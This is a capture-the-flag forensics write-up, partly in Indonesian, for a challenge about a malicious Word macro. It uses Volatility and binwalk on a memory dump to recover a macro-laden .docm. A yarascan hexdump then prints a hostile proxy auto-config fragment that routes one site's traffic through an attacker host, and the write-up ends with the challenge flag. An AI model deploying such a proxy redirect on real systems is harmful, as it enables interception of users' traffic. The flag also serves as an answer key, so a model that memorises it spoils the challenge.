<h1>Malicious Word macro</h1>
<h3>Description</h3>
<label>I opened an exciting Word file, but I think I was wrong.
Since then, a website dear to me does not work very well.

You have to find his favorite site. The validation password is the domain name of the website.

Uncompressed dump SHA256: 379a6a6ad73b390c5d556a34cc1bc0cb520e2589785ea27b658c88d3f83b9b19</label><a href='https://static.root-me.org/forensic/ch20/ch20.txz'>File</a>
<h3>Solution</h3>
<label>Analisa file memory dump</label>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# vol2 -f memory.dmp imageinfo filescan
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/venom/Downloads/memory.dmp)
                      PAE type : No PAE
                           DTB : 0x185000L
                          KDBG : 0x82953c28L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0x82954c00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2016-11-11 16:14:49 UTC+0000
     Image local date and time : 2016-11-11 17:14:49 +0100
                                                                                                                                                                                                                                                                                                                
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# vol2 -f memory.dmp filescan | grep doc
Volatility Foundation Volatility Framework 2.6.1
                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# vol2 -f memory.dmp --profile=Win7SP1x86 filescan | grep doc
Volatility Foundation Volatility Framework 2.6.1
0x000000000ee75598      6      0 R--r-d \Device\HarddiskVolume2\Windows\System32\shdocvw.dll
0x000000000eec5988      2      1 RW-r-- \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
0x000000000f3ee038      8      0 RW-r-- \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# vol2 -f memory.dmp --profile=Win7SP1x86 dumpfiles -Q 0x000000000eec5988 -D .
Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x0eec5988   None   \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
SharedCacheMap 0x0eec5988   None   \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# vol2 -f memory.dmp --profile=Win7SP1x86 dumpfiles -Q 0x000000000f3ee038 -D .
Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x0f3ee038   None   \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
SharedCacheMap 0x0f3ee038   None   \Device\HarddiskVolume2\Users\fraf\Downloads\Very_sexy.docm
```
<label>Analisa File Dump</label>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# ls  
ch20.txz  file.None.0x84cb24e8.dat  file.None.0x84f25cb0.vacb  memory.dmp                                                                                                                                                            
                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# binwalk -e file.None.0x84f25cb0.vacb --run-as=root

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 418, uncompressed size: 1638, name: [Content_Types].xml
987           0x3DB           Zip archive data, at least v2.0 to extract, compressed size: 239, uncompressed size: 590, name: _rels/.rels
1787          0x6FB           Zip archive data, at least v2.0 to extract, compressed size: 316, uncompressed size: 1205, name: word/_rels/document.xml.rels
2425          0x979           Zip archive data, at least v2.0 to extract, compressed size: 1191, uncompressed size: 3471, name: word/document.xml
3663          0xE4F           Zip archive data, at least v2.0 to extract, compressed size: 191, uncompressed size: 277, name: word/_rels/vbaProject.bin.rels
3914          0xF4A           Zip archive data, at least v2.0 to extract, compressed size: 5273, uncompressed size: 14336, name: word/vbaProject.bin
9236          0x2414          Zip archive data, at least v1.0 to extract, compressed size: 23562, uncompressed size: 23562, name: word/media/image1.jpeg
32850         0x8052          Zip archive data, at least v2.0 to extract, compressed size: 1582, uncompressed size: 6796, name: word/theme/theme1.xml
34483         0x86B3          Zip archive data, at least v2.0 to extract, compressed size: 1055, uncompressed size: 2951, name: word/settings.xml
35585         0x8B01          Zip archive data, at least v2.0 to extract, compressed size: 449, uncompressed size: 1367, name: word/vbaData.xml
36080         0x8CF0          Zip archive data, at least v2.0 to extract, compressed size: 630, uncompressed size: 2861, name: word/fontTable.xml
36758         0x8F96          Zip archive data, at least v2.0 to extract, compressed size: 4128, uncompressed size: 41596, name: word/styles.xml
40931         0x9FE3          Zip archive data, at least v2.0 to extract, compressed size: 461, uncompressed size: 978, name: docProps/app.xml
41702         0xA2E6          Zip archive data, at least v2.0 to extract, compressed size: 265, uncompressed size: 497, name: word/webSettings.xml
42017         0xA421          Zip archive data, at least v2.0 to extract, compressed size: 371, uncompressed size: 739, name: docProps/core.xml
42699         0xA6CB          Zip archive data, at least v2.0 to extract, compressed size: 1078, uncompressed size: 7331, name: word/numbering.xml

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# cd _file.None.0x84f25cb0.vacb.extracted  
                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads/_file.None.0x84f25cb0.vacb.extracted]
└─# ls
0.zip
                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads/_file.None.0x84f25cb0.vacb.extracted]
└─# 7z x 0.zip             

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:4 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 262144 bytes (256 KiB)

Extracting archive: 0.zip
            
WARNINGS:
There are data after the end of archive

--
Path = 0.zip
Type = zip
WARNINGS:
There are data after the end of archive
Physical Size = 44887
Tail Size = 217257
Characteristics = Local Central

Everything is Ok

Archives with Warnings: 1

Warnings: 1
Files: 16
Size:       110195
Compressed: 262144
                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads/_file.None.0x84f25cb0.vacb.extracted]
└─# ls
 0.zip  '[Content_Types].xml'   docProps   _rels   word
                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads/_file.None.0x84f25cb0.vacb.extracted]
└─# cd word                                
                                                                                                                                                            
┌──(root㉿Kali)-[/home/venom/Downloads/_file.None.0x84f25cb0.vacb.extracted/word]
└─# ls
document.xml  fontTable.xml  media  numbering.xml  _rels  settings.xml  styles.xml  theme  vbaData.xml  vbaProject.bin  webSettings.xml
                                                                                                                                                            
```
<label>Pada file vbaProject.bin ada url http://192.168.0.19:8080/BenNon.prox mencurigakan</label> 

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# vol2 -f memory.dmp --profile=Win7SP1x86 yarascan -Y "192.168.0.19"
Volatility Foundation Volatility Framework 2.6.1
Rule: r1
Owner: Process iexplore.exe Pid 3388
0x00378cff  31 39 32 2e 31 36 38 2e 30 2e 31 39 3a 38 30 38   192.168.0.19:808
0x00378d0f  30 22 3b 0a 09 7d 0a 20 20 20 20 72 65 74 75 72   0";..}.....retur
0x00378d1f  6e 20 22 44 49 52 45 43 54 22 3b 0a 7d 00 00 00   n."DIRECT";.}...
0x00378d2f  00 78 0e c5 51 00 00 00 8b 66 75 6e 63 74 69 6f   .x..Q....functio
0x00378d3f  6e 20 46 69 6e 64 50 72 6f 78 79 46 6f 72 55 52   n.FindProxyForUR
0x00378d4f  4c 28 75 72 6c 2c 20 68 6f 73 74 29 0a 7b 0a 09   L(url,.host).{..
0x00378d5f  69 66 20 28 73 68 45 78 70 4d 61 74 63 68 28 75   if.(shExpMatch(u
0x00378d6f  72 6c 2c 22 2a 2e 61 73 68 6c 65 79 6d 61 64 69   rl,"*.ashleymadi
0x00378d7f  73 6f 6e 2e 63 6f 6d 2f 2a 22 29 29 0a 09 7b 0a   son.com/*"))..{.
0x00378d8f  09 09 72 65 74 75 72 6e 20 22 50 52 4f 58 59 20   ..return."PROXY.
0x00378d9f  31 39 32 2e 31 36 38 2e 30 2e 31 39 3a 38 30 38   192.168.0.19:808
0x00378daf  30 22 3b 0a 09 7d 0a 20 20 20 20 72 65 74 75 72   0";..}.....retur
0x00378dbf  6e 20 22 44 49 52 45 43 54 22 3b 0a 7d 00 00 00   n."DIRECT";.}...
0x00378dcf  00 64 0e c5 51 00 00 00 88 e8 5d 9e 6e 78 8e 37   .d..Q.....].nx.7
0x00378ddf  00 ff ff ff ff 30 da 3f 00 ff ff ff ff ff ff ff   .....0.?........
0x00378def  ff ff ff ff ff b8 7b 3e 00 00 00 00 00 00 00 00   ......{>........
```
<h3>Flag</h3>
<pre>
ashleymadison.com
</pre>
